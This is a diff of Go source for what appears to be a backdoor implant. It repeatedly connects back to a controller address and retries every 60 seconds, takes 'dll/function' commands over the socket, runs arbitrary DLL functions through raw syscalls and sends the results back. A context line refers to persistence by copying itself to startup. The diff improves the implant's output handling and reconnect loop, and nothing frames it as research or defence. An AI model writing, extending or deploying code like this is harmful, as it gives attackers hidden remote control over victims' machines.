@@ -59,18 +59,25 @@ func callDLL(dllPath, funcName, arg1, arg2 string) (string, error) {
 		return "", fmt.Errorf("proc not found: %v", err)
 	}
 
+	output := make([]byte, 1 << 24)
 	cArg1 := append([]byte(arg1), 0)
 	cArg2 := append([]byte(arg2), 0)
-	r1, _, _ := syscall.Syscall(proc, 2,
-		uintptr(unsafe.Pointer(&cArg1[0])),
-		uintptr(unsafe.Pointer(&cArg2[0])),
-		0)
-	if r1 == 0 {
-		return "", fmt.Errorf("null pointer result")
+
+	_, _, _ = syscall.Syscall6(
+		proc,
+		4,
+		uintptr(unsafe.Pointer(&output[0])), uintptr(len(output)),
+		uintptr(unsafe.Pointer(&cArg1[0])), uintptr(unsafe.Pointer(&cArg2[0])),
+		0, 0,
+	)
+
+	// Read null-terminated C string from output buffer
+	end := 0
+	for end < len(output) && output[end] != 0 {
+		end++
 	}
-	result := C.GoString((*C.char)(unsafe.Pointer(r1)))
-        defer C.free(unsafe.Pointer(r1))
-	return result, nil
+
+	return string(output[:end]), nil
 }
 
 // Add persistence by copying itself to startup
@@ -104,8 +111,8 @@ func handle(conn net.Conn) {
 	for {
 		buf := make([]byte, 1 << 24)
 		n, err := conn.Read(buf)
-		go cleanup(dllHandle)
-		if err != nil {
+
+		if err != nil || n == 0 {
 			return
 		}
 		cmd := strings.TrimSpace(string(buf[:n]))
@@ -126,7 +133,7 @@ func handle(conn net.Conn) {
 			conn.Write([]byte("Invalid format: use dll/function\n"))
 			continue
 		}
-
+		
 		dllFile, fn := split[0], split[1]
 
 		// Internal static commands
@@ -151,7 +158,6 @@ func handle(conn net.Conn) {
 				continue
 			}
 		}
-		
 		result, err := callDLL(dllFile, fn, args[0], args[1])
 
 		if err != nil {
@@ -160,13 +166,17 @@ func handle(conn net.Conn) {
 		}
 
 		conn.Write([]byte("." + result + "\n"))
+		// go cleanup(dllHandle)
 	}
 }
 
 func main() {
 	for {
 		conn, err := net.Dial("tcp", consoleAddr)
+		
 		if err != nil {
+			time.Sleep(60 * time.Second)
+			
 			continue
 		}
 		handle(conn)
